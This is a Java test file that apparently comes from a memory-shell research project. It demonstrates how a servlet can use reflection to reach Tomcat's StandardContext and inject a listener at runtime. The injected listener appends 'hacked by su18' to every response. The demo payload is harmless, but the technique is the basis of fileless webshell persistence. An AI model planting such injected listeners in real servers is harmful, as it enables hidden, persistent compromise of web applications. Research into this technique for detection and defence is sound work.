package org.su18.memshell.test.tomcat;

import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.core.StandardContext;

import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;

/**
 * 访问这个 Servlet 将会动态添加自定义 Listener
 * 测试版本 Tomcat 8.5.31
 *
 * @author su18
 */
public class AddTomcatListener extends HttpServlet {

	@Override
	protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {

		ServletContext servletContext = req.getServletContext();

		StandardContext o = null;

		try {

			// 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象
			while (o == null) {
				Field f = servletContext.getClass().getDeclaredField("context");
				f.setAccessible(true);
				Object object = f.get(servletContext);

				if (object instanceof ServletContext) {
					servletContext = (ServletContext) object;
				} else if (object instanceof StandardContext) {
					o = (StandardContext) object;
				}
			}

			// 添加监听器
			o.addApplicationEventListener(new TestListener());

			resp.getWriter().println("tomcat listener added");

		} catch (Exception e) {
			e.printStackTrace();
		}

	}


	public static class TestListener implements ServletRequestListener {

		/**
		 * request 结束时进行操作
		 *
		 * @param servletRequestEvent ServletRequestEvent
		 */
		@Override
		public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
			try {
				RequestFacade request = (RequestFacade) servletRequestEvent.getServletRequest();
				Field         f       = request.getClass().getDeclaredField("request");
				f.setAccessible(true);
				Request req = (Request) f.get(request);

				req.getResponse().getWriter().println("\nhacked by su18");

			} catch (Exception e) {
				e.printStackTrace();
			}


		}

		/**
		 * request 初始化时进行操作
		 *
		 * @param servletRequestEvent ServletRequestEvent 对象
		 */
		@Override
		public void requestInitialized(ServletRequestEvent servletRequestEvent) {
		}
	}
}
